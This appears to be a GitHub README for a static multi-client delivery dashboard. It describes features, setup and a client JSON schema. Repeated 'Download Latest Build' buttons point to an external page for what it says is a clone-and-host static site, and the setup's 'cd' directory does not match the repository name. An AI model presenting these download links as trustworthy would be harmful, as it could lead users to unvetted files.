# GrowSales AI Agency v2026 - multi-client delivery tracker 2026

> **GrowSales AI Agency is a static GitHub Pages client-delivery dashboard for AI agencies. It brings multi-client work, approvals, and change requests together in a single interface.**

[![Platform](https://img.shields.io/badge/Platform-GitHub%20Pages-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/hallvictorytec2150/growsales-agency-work-tracker?style=flat-square)](https://github.com/hallvictorytec2150/growsales-agency-work-tracker)

---

<p align="center">
  <a href="https://hallvictorytec2150.github.io/growsales-agency-work-tracker/">
    <img src="https://img.shields.io/badge/Download-GrowSales%20AI%20Agency%20Latest-brightgreen?style=for-the-badge" alt="Download GrowSales AI Agency">
  </a>
</p>

> **[Download GrowSales AI Agency v2026](https://hallvictorytec2150.github.io/growsales-agency-work-tracker/)**

---

[Download Latest Build](https://hallvictorytec2150.github.io/growsales-agency-work-tracker/)

---

## Product Overview

GrowSales AI Agency provides agencies with a static workspace for coordinating delivery across multiple customers. A central dashboard summarizes the portfolio, while separate client pages expose project progress, deliverables, and approval information in a consistent format.

Because it does not depend on a conventional backend, the project works well for teams seeking a lightweight operational dashboard. Client templates and schema-based definitions help create new pages consistently, while change-request information can be recorded next to delivery updates.

---

## Core Capabilities

- Dedicated tracker pages for each client workstream
- Portfolio-level dashboard combining information from every client
- Deliverable fields for monitoring active project work
- Approval indicators for following the review lifecycle
- Visible Claude change-request commands for revision workflows
- Templates and schemas for adding client records consistently
- CI validation for links, HTML, secrets, and draft material
- Static hosting layout compatible with GitHub Pages or Vercel

---

## Getting Started

First clone the repository, or download its files, and then deploy the static content through the hosting service you choose.

    git clone https://github.com/hallvictorytec2150/growsales-agency-work-tracker.git
    cd ai-agency

For GitHub Pages or Vercel deployments, serve the repository root as a static site. Once deployment finishes, open the main dashboard in a browser.

---

## Working with the Dashboard

The master dashboard is the portfolio entry point. It lets you scan every client, then navigate to an individual client page for detailed deliverable progress, approval status, and change-request instructions.

A normal operating sequence looks like this:

1. Create a client record from the supplied template and schema.
2. Adjust deliverable and approval values as the work moves forward.
3. Consult the displayed change-request command information when revisions are requested.
4. Return to the master dashboard to review the combined client status.
5. Execute the CI checks before publishing the latest changes.

---

## Data and Configuration

This project stores its settings in the static site structure and client data files instead of a server-side configuration system.

When making extensions, ensure each client definition follows the template schema. Also preserve the dashboard references that connect the main overview to the corresponding client pages.

Example structure:

    {
      "client": "Acme",
      "status": "in progress",
      "approval": "pending",
      "deliverables": []
    }

---

## Requirements

- A web browser to access the dashboard and individual client pages
- Static hosting, including GitHub Pages or Vercel
- Write permission for changing dashboard content and client pages
- HTML-based site assets, as the application is delivered statically
- Optional CI tooling for running validation checks during updates

---

## Frequently Asked Questions

**How can I create another client page?**  
Start with the repository's client template and schema, then add the resulting page to the master dashboard.

**When do edits become visible?**  
They appear on the static pages after the changes have been committed and the repository has been published.

**How should I investigate a broken link?**  
Run the link and HTML checks included in the repository, then confirm that the dashboard correctly points to each client page.

**How does the project record change requests?**  
A dedicated visible area displays Claude change-request commands, allowing revision instructions to remain associated with delivery tracking.

**Does this require a backend?**  
No. It is a static site and can be hosted without server-side code.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
